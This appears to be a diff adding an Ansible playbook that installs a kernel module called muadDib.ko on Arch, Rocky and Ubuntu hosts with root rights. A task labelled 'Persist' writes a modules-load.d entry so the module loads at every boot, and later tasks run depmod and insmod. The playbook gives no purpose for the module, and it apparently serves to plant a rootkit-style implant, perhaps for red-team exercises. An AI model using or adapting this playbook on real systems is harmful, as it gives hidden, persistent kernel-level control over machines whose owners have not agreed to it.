@@ -1,0 +1,44 @@
+--- 
+- name: Get Kernel Version (OS -- EXAMPLE)
+  ansible.builtin.shell: uname -r
+  register: kernel_ver
+  when: ansible_system == 'Linux'
+
+- name: Copy ko - Arch
+  become: true
+  ansible.builtin.copy: 
+    src: files/arch/muadDib.ko
+    dest: /lib/modules/{{ kernel_ver.stdout }}/kernel/lib/MUADDIB_muadDib.ko
+  when: ansible_distribution == 'ArchLinux'
+
+- name: Copy ko - Rocky
+  become: true
+  ansible.builtin.copy:
+    src: files/rocky/{{ kernel_ver.stdout }}/muadDib.ko
+    dest: /lib/modules/{{ kernel_ver.stdout }}/kernel/lib/MUADDIB_muadDib.ko
+  when: ansible_os_family == 'RedHat'
+
+- name: Copy ko - Ubuntu
+  become: true
+  ansible.builtin.copy:
+    src: files/ubuntu/{{ kernel_ver.stdout }}/muadDib.ko
+    dest: /lib/modules/{{ kernel_ver.stdout }}/kernel/lib/MUADDIB_muadDib.ko
+  when: ansible_os_family == 'Debian'
+
+- name: Persist
+  become: true
+  ansible.builtin.copy: 
+    dest: /etc/modules-load.d/MUADDIB.conf
+    content: |
+      MUADDIB_muadDib
+  when: ansible_system == 'Linux'
+
+- name: Depmod
+  become: true
+  ansible.builtin.shell: depmod -a
+  when: ansible_system == 'Linux'
+
+- name: Load
+  become: true
+  ansible.builtin.shell: insmod /lib/modules/{{ kernel_ver.stdout }}/kernel/lib/MUADDIB_muadDib.ko
+  when: ansible_system == 'Linux'
